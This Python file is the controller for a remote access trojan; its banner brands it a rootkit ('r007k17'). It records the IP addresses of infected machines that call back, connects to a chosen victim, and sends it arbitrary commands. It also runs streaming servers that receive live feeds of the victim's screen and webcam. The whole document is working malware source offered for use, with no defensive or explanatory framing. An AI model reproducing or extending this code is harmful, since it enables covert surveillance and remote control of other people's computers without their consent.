import socket
import os
from vidstream import StreamingServer
import threading


print("###################################")
print("##### r007k17 by 7r1574n n13l #####")
print("###################################")

ipToConnect = str()
ipHost = "192.168.1.48"
port = 22228

def command(commandToExecute):
    global ipToConnect
    if commandToExecute[0:8] in ("connect ", "connexion ", "connecter ", "co "):
        ipToConnect = commandToExecute[8:len(commandToExecute)]
        return ipToConnect
    elif commandToExecute in ("getIp", "Ipget", "getip", "ipget"):
        getIp()
    elif commandToExecute in ("listIp", "Iplist", "iplist", "listip"):
        listIp()
        command(input(">"))
    elif commandToExecute in ("stop"):
        global progrun
        progrun = False
    else:
        print("Error")
        command(input(">"))

def sendData(data):
        global run
        if data == "die":
            client.send(data.encode())
            run = False
        elif data == "screenStart":
            client.send("screen".encode())
        elif data == "screenStop":
            screenStop()
        elif data == "cameraStart":
            client.send("camera".encode())
        elif data == "cameraStop":
            cameraStop()
        else:
            client.send(data.encode())

def getIp():
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((ipHost, 22227))
    serverSocket.listen()
    (clientConnected, clientAddress) = serverSocket.accept()
    print("Connection acquired from %s:%s" % (clientAddress[0], clientAddress[1]))
    serverSocket.close()
    addIp(clientAddress[0])
    command(input(">"))


def addIp(ipToAdd):
    f = open("ListIp.txt", "a")
    f.write(ipToAdd + "\n")
    f.close()


def listIp():
    f = open("ListIp.txt", "r")
    lines = f.readlines()
    for line in lines:
        print(line)
    f.close()
    command(input(">"))


def screenStop():
    global screen
    screen.stop_server()
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    
def cameraStop():
    global camera
    camera.stop_server()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()

            
progrun = True

while progrun == True:
    ip = command(input(">"))
    if progrun == True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
    
    
    screen = StreamingServer(ipHost, 22224)
    t = threading.Thread(target=screen.start_server)
    t.start()
    camera = StreamingServer(ipHost, 22225)
    t = threading.Thread(target=camera.start_server)
    t.start()
    
    run = True
    while run == True and progrun == True:
        dataToSend = input("%s>" % (ip))
        sendData(dataToSend)
print("prog stop")
exit()